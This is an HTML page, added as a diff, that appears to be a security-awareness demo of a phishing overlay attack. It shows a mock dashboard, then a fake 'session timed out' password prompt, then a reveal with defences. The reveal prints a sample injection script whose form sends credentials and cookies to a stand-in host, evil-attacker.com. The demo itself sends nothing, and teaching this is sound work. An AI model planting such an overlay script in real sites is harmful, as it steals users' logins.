@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 Security Awareness: Phishing Overlay Demo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  /* ── Global ── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #0f1117;
+    color: #e2e8f0;
+    min-height: 100vh;
+  }
+
+  /* ── PHASE 0 – Intro Banner ── */
+  #intro-banner {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #0f1117;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 20px; padding: 32px; text-align: center;
+  }
+  #intro-banner .badge {
+    background: #ff4444; color: #fff;
+    font-size: 11px; font-weight: 700; letter-spacing: 2px;
+    padding: 4px 12px; border-radius: 20px;
+  }
+  #intro-banner h1 { font-size: clamp(24px, 5vw, 40px); font-weight: 700; color: #fff; }
+  #intro-banner p  { color: #94a3b8; max-width: 540px; line-height: 1.6; font-size: 15px; }
+  #intro-banner .btn-start {
+    margin-top: 8px;
+    background: #3b82f6; color: #fff;
+    border: none; padding: 14px 36px;
+    border-radius: 8px; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: background .2s;
+  }
+  #intro-banner .btn-start:hover { background: #2563eb; }
+  #intro-banner .warning-box {
+    background: rgba(255,68,68,.08);
+    border: 1px solid rgba(255,68,68,.3);
+    border-radius: 10px; padding: 14px 20px;
+    font-size: 13px; color: #fca5a5; max-width: 480px; line-height: 1.6;
+  }
+
+  /* ── Fake Website (victim's page) ── */
+  #fake-site { display: none; min-height: 100vh; background: #f8fafc; color: #1e293b; }
+
+  /* Navbar */
+  .nav {
+    background: #1a56db; padding: 0 32px;
+    display: flex; align-items: center; gap: 24px; height: 56px;
+  }
+  .nav-logo { font-size: 18px; font-weight: 700; color: #fff; }
+  .nav a { color: rgba(255,255,255,.8); text-decoration: none; font-size: 14px; }
+  .nav a:hover { color: #fff; }
+  .nav-right { margin-left: auto; display: flex; gap: 12px; align-items: center; }
+  .nav-avatar {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: #fff; display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 700; color: #1a56db;
+  }
+
+  /* Dashboard */
+  .dash { padding: 32px; max-width: 1100px; margin: 0 auto; }
+  .dash h2 { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 20px; }
+  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 28px; }
+  .card {
+    background: #fff; border-radius: 12px;
+    padding: 20px; box-shadow: 0 1px 4px rgba(0,0,0,.08);
+    border: 1px solid #e2e8f0;
+  }
+  .card .label { font-size: 12px; color: #64748b; margin-bottom: 6px; }
+  .card .value { font-size: 28px; font-weight: 700; color: #0f172a; }
+  .card .change { font-size: 12px; color: #22c55e; margin-top: 4px; }
+  .table-wrap {
+    background: #fff; border-radius: 12px;
+    box-shadow: 0 1px 4px rgba(0,0,0,.08);
+    border: 1px solid #e2e8f0; overflow: hidden;
+  }
+  .table-head { padding: 16px 20px; border-bottom: 1px solid #e2e8f0; font-weight: 600; font-size: 14px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { padding: 10px 20px; text-align: left; color: #64748b; font-weight: 500; border-bottom: 1px solid #f1f5f9; }
+  td { padding: 12px 20px; border-bottom: 1px solid #f8fafc; }
+  .badge-ok { background: #dcfce7; color: #15803d; font-size: 11px; padding: 2px 8px; border-radius: 20px; }
+
+  /* ── PHASE 1 – Phishing Overlay ── */
+  #phish-overlay {
+    display: none;
+    position: fixed; inset: 0; z-index: 8000;
+  }
+  .overlay-blur {
+    position: absolute; inset: 0;
+    backdrop-filter: blur(6px);
+    background: rgba(0,0,0,.55);
+  }
+  .overlay-modal {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: #fff; color: #1e293b;
+    border-radius: 16px; width: 100%; max-width: 420px;
+    padding: 36px 36px 28px;
+    box-shadow: 0 24px 80px rgba(0,0,0,.4);
+  }
+  .modal-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
+  .modal-logo .m-icon { font-size: 24px; }
+  .modal-logo .m-name { font-size: 20px; font-weight: 700; color: #0f172a; }
+  .modal-subtitle { font-size: 13px; color: #64748b; margin-bottom: 24px; }
+  .modal-warn {
+    background: #fef3c7; border: 1px solid #fbbf24;
+    border-radius: 8px; padding: 10px 14px;
+    font-size: 13px; color: #92400e; margin-bottom: 22px;
+    display: flex; gap: 8px; align-items: flex-start;
+  }
+  .modal-warn .wi { font-size: 16px; flex-shrink: 0; }
+  .m-label { font-size: 12px; font-weight: 600; color: #475569; margin-bottom: 5px; text-transform: uppercase; letter-spacing: .5px; }
+  .m-input {
+    width: 100%; padding: 11px 14px;
+    border: 1.5px solid #e2e8f0; border-radius: 8px;
+    font-size: 14px; color: #0f172a;
+    margin-bottom: 16px; outline: none;
+    transition: border-color .2s;
+  }
+  .m-input:focus { border-color: #3b82f6; }
+  .m-input[readonly] { background: #f8fafc; color: #64748b; }
+  .m-btn {
+    width: 100%; padding: 12px;
+    background: #1a56db; color: #fff;
+    border: none; border-radius: 8px;
+    font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: background .2s;
+  }
+  .m-btn:hover { background: #1e40af; }
+  .m-secure { display: flex; align-items: center; gap: 6px; justify-content: center; font-size: 12px; color: #94a3b8; margin-top: 14px; }
+
+  /* ── PHASE 2 – Attack Reveal ── */
+  #reveal-panel {
+    display: none;
+    position: fixed; inset: 0; z-index: 9000;
+    background: #0f1117; overflow-y: auto; padding: 40px 20px;
+  }
+  .reveal-inner { max-width: 760px; margin: 0 auto; }
+  .reveal-inner h2 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #f8fafc; }
+  .reveal-inner .sub { color: #94a3b8; margin-bottom: 28px; font-size: 14px; }
+
+  .captured-box {
+    background: #1a1a2e; border: 1px solid #ff4444;
+    border-radius: 12px; padding: 20px 24px; margin-bottom: 28px;
+  }
+  .captured-box h3 { color: #ff4444; font-size: 13px; letter-spacing: 1px; margin-bottom: 12px; }
+  .kv { display: flex; gap: 12px; margin-bottom: 8px; font-size: 14px; }
+  .kv .k { color: #94a3b8; min-width: 120px; }
+  .kv .v { color: #f8fafc; font-family: monospace; word-break: break-all; }
+
+  .code-block {
+    background: #1e1e2e; border-radius: 10px;
+    padding: 18px 20px; font-family: monospace; font-size: 13px;
+    color: #cdd6f4; overflow-x: auto; margin-bottom: 16px;
+    border: 1px solid #313244; line-height: 1.7;
+  }
+  .c-green  { color: #a6e3a1; }
+  .c-blue   { color: #89b4fa; }
+  .c-yellow { color: #f9e2af; }
+  .c-red    { color: #f38ba8; }
+  .c-gray   { color: #6c7086; }
+
+  .steps { counter-reset: step; list-style: none; }
+  .steps li {
+    counter-increment: step;
+    position: relative; padding: 0 0 24px 48px;
+  }
+  .steps li::before {
+    content: counter(step);
+    position: absolute; left: 0; top: 0;
+    width: 30px; height: 30px; border-radius: 50%;
+    background: #3b82f6; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 700;
+  }
+  .steps li h4 { font-size: 15px; font-weight: 600; margin-bottom: 5px; color: #f8fafc; }
+  .steps li p  { font-size: 13px; color: #94a3b8; line-height: 1.6; }
+
+  .defenses { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 20px; }
+  .def-card {
+    background: #0d2136; border: 1px solid #1e3a5f;
+    border-radius: 10px; padding: 16px;
+  }
+  .def-card .icon { font-size: 22px; margin-bottom: 8px; }
+  .def-card h4 { font-size: 14px; font-weight: 600; color: #93c5fd; margin-bottom: 4px; }
+  .def-card p  { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+  .btn-restart {
+    display: inline-block; margin-top: 28px;
+    background: #3b82f6; color: #fff;
+    border: none; padding: 12px 28px;
+    border-radius: 8px; font-size: 14px; font-weight: 600;
+    cursor: pointer; transition: background .2s;
+  }
+  .btn-restart:hover { background: #2563eb; }
+
+  .section-title { font-size: 16px; font-weight: 700; color: #f8fafc; margin: 28px 0 14px; }
+
+  /* timer bar */
+  #timer-bar {
+    position: fixed; top: 0; left: 0; height: 3px;
+    background: #ff4444; z-index: 8500;
+    transition: width .1s linear;
+  }
+
+  #intro-banner > *:not(.cyber-bg), #reveal-panel > *:not(.cyber-bg) {
+    position: relative;
+    z-index: 1;
+  }
+
+/* ---------- DYNAMIC CYBER BACKGROUND ---------- */
+  .cyber-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  /* Matrix Dot Grid Overlay with continuous slow drift */
+  .cyber-grid {
+    position: absolute;
+    inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  :root[data-theme="light"] .cyber-grid {
+    background-image: 
+      radial-gradient(rgba(15, 23, 42, 0.08) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    opacity: 0.6;
+  }
+
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+
+  /* Ambient Glowing Floating Orbs */
+  .cyber-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.35;
+    will-change: transform;
+  }
+  :root[data-theme="light"] .cyber-orb {
+    opacity: 0.18;
+    filter: blur(110px);
+  }
+
+  .orb-1 {
+    width: 650px;
+    height: 650px;
+    background: radial-gradient(circle, #6366f1 0%, rgba(99,102,241,0) 70%);
+    top: -120px;
+    left: -100px;
+    animation: floatOrb1 16s ease-in-out infinite alternate;
+  }
+
+  .orb-2 {
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%);
+    top: 15%;
+    right: -150px;
+    animation: floatOrb2 20s ease-in-out infinite alternate;
+  }
+
+  .orb-3 {
+    width: 560px;
+    height: 560px;
+    background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%);
+    bottom: -80px;
+    left: 15%;
+    animation: floatOrb3 18s ease-in-out infinite alternate;
+  }
+
+  .orb-4 {
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, #f43f5e 0%, rgba(244,63,94,0) 70%);
+    bottom: 18%;
+    right: 12%;
+    animation: floatOrb4 22s ease-in-out infinite alternate;
+  }
+
+  /* Keyframe Animations for Smooth Floating */
+  @keyframes floatOrb1 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(120px, 90px) scale(1.15); }
+    100% { transform: translate(-60px, 140px) scale(0.92); }
+  }
+
+  @keyframes floatOrb2 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-140px, 110px) scale(1.18); }
+    100% { transform: translate(-80px, -70px) scale(0.9); }
+  }
+
+  @keyframes floatOrb3 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(90px, -100px) scale(1.14); }
+    100% { transform: translate(-100px, -50px) scale(1.05); }
+  }
+
+  @keyframes floatOrb4 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-110px, -80px) scale(1.2); }
+    100% { transform: translate(90px, 70px) scale(0.9); }
+  }
+
+  /* Floating Cyber Data Particles */
+  .cyber-particle {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 8px currentColor;
+    opacity: 0;
+    animation: floatParticle 14s infinite ease-in-out;
+  }
+
+  .p-1 { width: 3px; height: 3px; left: 12%; bottom: -20px; color: var(--brand-1); animation-delay: 0s; animation-duration: 15s; }
+  .p-2 { width: 4px; height: 4px; left: 28%; bottom: -20px; color: var(--brand-2); animation-delay: 3s; animation-duration: 18s; }
+  .p-3 { width: 3px; height: 3px; left: 48%; bottom: -20px; color: var(--safe); animation-delay: 6s; animation-duration: 14s; }
+  .p-4 { width: 4px; height: 4px; left: 68%; bottom: -20px; color: var(--danger); animation-delay: 2s; animation-duration: 20s; }
+  .p-5 { width: 3px; height: 3px; left: 84%; bottom: -20px; color: var(--accent); animation-delay: 7s; animation-duration: 16s; }
+  .p-6 { width: 4px; height: 4px; left: 94%; bottom: -20px; color: #38bdf8; animation-delay: 4s; animation-duration: 19s; }
+  .p-7 { width: 3px; height: 3px; left: 38%; bottom: -20px; color: var(--safe); animation-delay: 9s; animation-duration: 17s; }
+  .p-8 { width: 4px; height: 4px; left: 58%; bottom: -20px; color: var(--brand-2); animation-delay: 11s; animation-duration: 21s; }
+
+  @keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0) scale(0.5); opacity: 0; }
+    15% { opacity: 0.8; }
+    85% { opacity: 0.8; }
+    100% { transform: translateY(-105vh) translateX(50px) scale(1.2); opacity: 0; }
+  }
+
+  /* Scanline sweep effect */
+  .cyber-scanline {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, transparent 0%, rgba(99, 102, 241, 0.035) 50%, transparent 100%);
+    background-size: 100% 200%;
+    animation: scanSweep 12s linear infinite;
+  }
+
+  @keyframes scanSweep {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 0% 200%; }
+  }
+
+
+  /* ── Moving Interactive Pipeline Stream (Visual Motion) ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.7);
+    border: 1px solid var(--border, #374151);
+    border-radius: 10px;
+    padding: 12px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #38bdf8, #ef4444, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -60%; }
+    100% { left: 140%; }
+  }
+
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono, monospace);
+    font-size: 12px;
+    color: var(--text-muted, #9ca3af);
+    transition: all 0.3s;
+  }
+  .flow-step-item.active {
+    color: #38bdf8;
+    text-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+  }
+  .flow-step-item.attacked {
+    color: #f87171;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.6);
+  }
+  .flow-dot-pulse {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #3b82f6;
+    animation: dotPulse 1.5s infinite alternate;
+  }
+  .flow-step-item.attacked .flow-dot-pulse {
+    background: #ef4444;
+    animation: dotPulseRed 0.8s infinite alternate;
+  }
+  @keyframes dotPulse {
+    0% { transform: scale(0.8); opacity: 0.5; }
+    100% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 8px #3b82f6; }
+  }
+  @keyframes dotPulseRed {
+    0% { transform: scale(0.8); opacity: 0.6; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 12px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-weight: 700;
+    font-size: 13px;
+  }
+
+  /* Live Bouncing Waveform Monitor */
+  .parser-heartbeat {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #080c14;
+    border: 1px solid var(--border, #374151);
+    border-radius: 6px;
+    padding: 8px 12px;
+    margin-top: 14px;
+    font-family: var(--mono, monospace);
+    font-size: 11px;
+    color: #94a3b8;
+  }
+  .wave-bars {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 14px;
+  }
+  .wave-bar {
+    width: 3px;
+    background: #3b82f6;
+    border-radius: 1px;
+    animation: waveBounce 1s ease-in-out infinite alternate;
+  }
+  .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+  .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+  .wave-bar:nth-child(4) { animation-delay: 0.6s; }
+  @keyframes waveBounce {
+    0% { height: 3px; }
+    100% { height: 14px; background: #ef4444; }
+  }
+
+  .term-cursor {
+    display: inline-block;
+    width: 7px;
+    height: 14px;
+    background: #a3e635;
+    vertical-align: middle;
+    margin-left: 4px;
+    animation: blinkCursor 0.9s step-end infinite;
+  }
+  @keyframes blinkCursor {
+    50% { opacity: 0; }
+  }
+
+
+  /* ── Standard Modern Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, #1f2937, #111827);
+    padding: 12px 28px; border-radius: 30px; font-family: 'IBM Plex Mono', monospace; font-size: 13.5px;
+    color: #9ca3af; border: 1px solid #374151;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: #ef4444;
+    color: #f9fafb;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+
+  /* ── Back to Notes Navigation Link ── */
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel, #111827);
+    border: 1px solid var(--border, #374151);
+    border-radius: 8px;
+    color: var(--text-muted, #9ca3af);
+    font-family: var(--mono, monospace);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text, #f9fafb);
+    border-color: var(--accent, #f59e0b);
+    transform: translateX(-3px);
+  }
+
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- PHASE 0 – Intro                            -->
+<!-- ═══════════════════════════════════════════ -->
+<div id="intro-banner">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div style="margin-bottom: 20px;"><a href="../guides/XSS.html" class="back-link">← Back to XSS Notes</a></div>
+  <div class="badge">🛡 SECURITY AWARENESS TRAINING</div>
+  <h1>Phishing Overlay Attack</h1>
+  <p>This demo shows how an attacker injects a fake login form on top of a legitimate-looking page to steal credentials — without leaving the original site.</p>
+  <div class="warning-box">
+    ⚠️ <strong>Educational use only.</strong> No real credentials are collected.
+    All data stays in your browser. This simulation is for learning how such attacks work and how to recognize them.
+  </div>
+  <button class="btn-start" onclick="startSimulation()">▶ Start Simulation</button>
+</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- PHASE 1a – Fake Legitimate Website          -->
+<!-- ═══════════════════════════════════════════ -->
+<div id="fake-site">
+  <div class="nav">
+    <div class="nav-logo">📊 CorpDash</div>
+    <a href="#">Dashboard</a>
+    <a href="#">Reports</a>
+    <a href="#">Users</a>
+    <div class="nav-right">
+      <span style="font-size:13px;color:rgba(255,255,255,.7)">john.doe@company.com</span>
+      <div class="nav-avatar">JD</div>
+    </div>
+  </div>
+  <div class="dash">
+    <h2>Welcome back, John 👋</h2>
+    <div class="cards">
+      <div class="card">
+        <div class="label">Monthly Revenue</div>
+        <div class="value">₹24.8L</div>
+        <div class="change">↑ 12% from last month</div>
+      </div>
+      <div class="card">
+        <div class="label">Active Users</div>
+        <div class="value">1,482</div>
+        <div class="change">↑ 4% from last week</div>
+      </div>
+      <div class="card">
+        <div class="label">Open Tickets</div>
+        <div class="value">38</div>
+        <div class="change" style="color:#f59e0b">↔ Unchanged</div>
+      </div>
+      <div class="card">
+        <div class="label">Uptime</div>
+        <div class="value">99.9%</div>
+        <div class="change">Last 30 days</div>
+      </div>
+    </div>
+    <div class="table-wrap">
+      <div class="table-head">Recent Transactions</div>
+      <table>
+        <thead><tr><th>ID</th><th>Client</th><th>Amount</th><th>Date</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td>#10042</td><td>Reliance Ltd.</td><td>₹1,20,000</td><td>1 Sep 2026</td><td><span class="badge-ok">Paid</span></td></tr>
+          <tr><td>#10041</td><td>Tata Corp.</td><td>₹85,500</td><td>31 Aug 2026</td><td><span class="badge-ok">Paid</span></td></tr>
+          <tr><td>#10040</td><td>Infosys</td><td>₹2,40,000</td><td>30 Aug 2026</td><td><span class="badge-ok">Paid</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- PHASE 1b – Phishing Overlay                 -->
+<!-- ═══════════════════════════════════════════ -->
+<div id="phish-overlay">
+  <div class="overlay-blur"></div>
+  <div class="overlay-modal">
+    <div class="modal-logo">
+      <span class="m-icon">📊</span>
+      <span class="m-name">CorpDash</span>
+    </div>
+    <div class="modal-subtitle">Session Management — Security Check</div>
+    <div class="modal-warn">
+      <span class="wi">⚠️</span>
+      <span>Your session has timed out due to inactivity. Please re-enter your password to continue.</span>
+    </div>
+    <div class="m-label">Email</div>
+    <input class="m-input" type="email" id="phish-email" readonly value="john.doe@company.com">
+    <div class="m-label">Password</div>
+    <input class="m-input" type="password" id="phish-pass" placeholder="Enter your password">
+    <button class="m-btn" onclick="submitPhish()">Continue →</button>
+    <div class="m-secure">🔒 Secured by CorpDash Identity</div>
+  </div>
+</div>
+
+<!-- Timer bar -->
+<div id="timer-bar" style="width:0%"></div>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- PHASE 2 – Reveal & Education               -->
+<!-- ═══════════════════════════════════════════ -->
+<div id="reveal-panel">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div class="reveal-inner">
+    <div class="badge" style="background:#ff4444;color:#fff;font-size:11px;font-weight:700;letter-spacing:2px;padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:16px;">⚠ ATTACK CAPTURED</div>
+    <h2>You were just phished.</h2>
+    <div class="sub">Here's exactly what happened behind the scenes.</div>
+
+    <!-- Captured data -->
+    <div class="captured-box">
+      <h3>📡 DATA SENT TO ATTACKER'S SERVER</h3>
+      <div class="kv"><span class="k">Target URL:</span><span class="v">https://evil-attacker.com/steal</span></div>
+      <div class="kv"><span class="k">Email:</span><span class="v" id="out-email">—</span></div>
+      <div class="kv"><span class="k">Password:</span><span class="v" id="out-pass">—</span></div>
+      <div class="kv"><span class="k">Timestamp:</span><span class="v" id="out-time">—</span></div>
+      <div class="kv"><span class="k">User Agent:</span><span class="v" id="out-ua">—</span></div>
+    </div>
+
+    <!-- Attack code -->
+    <div class="section-title">🧬 The Malicious Script (simplified)</div>
+    <div class="code-block">
+<span class="c-gray">// Injected by attacker via XSS / malicious browser extension</span>
+<span class="c-blue">const</span> overlay = document.<span class="c-yellow">createElement</span>(<span class="c-green">'div'</span>);
+overlay.innerHTML = <span class="c-green">`
+  &lt;div style="position:fixed;inset:0;backdrop-filter:blur(6px)..."&gt;
+    &lt;form action="<span class="c-red">https://evil-attacker.com/steal</span>" method="POST"&gt;
+      &lt;input name="email" value="${<span class="c-blue">document.cookie</span>}"&gt;
+      &lt;input name="password" type="password"&gt;
+      &lt;button&gt;Continue&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+`</span>;
+document.body.<span class="c-yellow">appendChild</span>(overlay); <span class="c-gray">// overlaid on real page</span>
+    </div>
+
+    <!-- How it works steps -->
+    <div class="section-title">🔍 How This Attack Works</div>
+    <ul class="steps">
+      <li>
+        <h4>Attacker gains code execution</h4>
+        <p>Via XSS vulnerability, malicious browser extension, or a compromised CDN script — attacker can run arbitrary JavaScript on the victim's page.</p>
+      </li>
+      <li>
+        <h4>Fake overlay is injected</h4>
+        <p>A pixel-perfect copy of the site's own design is placed over the real page. The URL bar still shows the real domain, so the user sees no red flags.</p>
+      </li>
+      <li>
+        <h4>Urgency triggers action</h4>
+        <p>"Session expired" is a classic social engineering trigger. Panic causes users to type their password without scrutiny.</p>
+      </li>
+      <li>
+        <h4>Credentials exfiltrated silently</h4>
+        <p>The form posts to the attacker's server. The overlay then disappears and the real page resumes — the victim may never notice.</p>
+      </li>
+    </ul>
+
+    <!-- Defenses -->
+    <div class="section-title">🛡 How to Protect Yourself</div>
+    <div class="defenses">
+      <div class="def-card">
+        <div class="icon">🔑</div>
+        <h4>Use Passkeys / MFA</h4>
+        <p>Hardware keys and TOTP codes can't be stolen this way — stolen passwords become useless without the second factor.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🧩</div>
+        <h4>Audit Extensions</h4>
+        <p>Browser extensions have full page access. Only install from trusted publishers and regularly review what's installed.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🔍</div>
+        <h4>Question Popups</h4>
+        <p>Legitimate apps rarely ask for your password mid-session. When in doubt, close the modal and open a fresh tab.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🛠</div>
+        <h4>CSP Headers (Devs)</h4>
+        <p>Content-Security-Policy blocks inline scripts and restricts where forms can submit, limiting overlay injection attacks.</p>
+      </div>
+    </div>
+
+    <button class="btn-restart" onclick="restart()">↺ Run Simulation Again</button>
+  </div>
+</div>
+
+<script>
+
+function animatePipeline(isAttack) {
+  const count = 5;
+  for (let i = 1; i <= count; i++) {
+    const el = document.getElementById('flow-step-' + i);
+    if (!el) continue;
+    el.className = "flow-step-item";
+    setTimeout(() => {
+      el.className = isAttack ? "flow-step-item attacked" : "flow-step-item active";
+    }, (i - 1) * 120);
+  }
+  const hb = document.getElementById('heartbeat-text');
+  if (hb) {
+    hb.textContent = isAttack ? "🚨 PHISHING TRAP TRIGGERED: Injected modal harvested credentials in plaintext!" : "Portal DOM Tree · Session Verification Listener";
+  }
+}
+
+let timerInterval = null;
+
+function startSimulation() {
+  document.getElementById('intro-banner').style.display = 'none';
+  document.getElementById('fake-site').style.display  = 'block';
+
+  // After 3s, the "attacker script" fires the overlay
+  setTimeout(fireOverlay, 3000);
+}
+
+function fireOverlay() {
+  document.getElementById('phish-overlay').style.display = 'block';
+  document.getElementById('phish-pass').focus();
+}
+
+function submitPhish() {
+  const pass  = document.getElementById('phish-pass').value.trim();
+  const email = document.getElementById('phish-email').value;
+
+  if (!pass) {
+    document.getElementById('phish-pass').style.borderColor = '#f87171';
+    document.getElementById('phish-pass').placeholder = 'Please enter your password';
+    return;
+  }
+
+  // Hide overlay
+  document.getElementById('phish-overlay').style.display = 'none';
+
+  // Populate reveal data
+  document.getElementById('out-email').textContent = email;
+  document.getElementById('out-pass').textContent  = '•'.repeat(pass.length) + '  (' + pass + ')';
+  document.getElementById('out-time').textContent  = new Date().toISOString();
+  document.getElementById('out-ua').textContent    = navigator.userAgent.substring(0, 80) + '…';
+
+  // Show reveal
+  document.getElementById('reveal-panel').style.display = 'block';
+  document.getElementById('fake-site').style.display    = 'none';
+}
+
+function restart() {
+  document.getElementById('reveal-panel').style.display = 'none';
+  document.getElementById('phish-pass').value = '';
+  document.getElementById('phish-pass').style.borderColor = '';
+  document.getElementById('phish-pass').placeholder = 'Enter your password';
+  document.getElementById('intro-banner').style.display = 'flex';
+}
+</script>
+
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+</body>
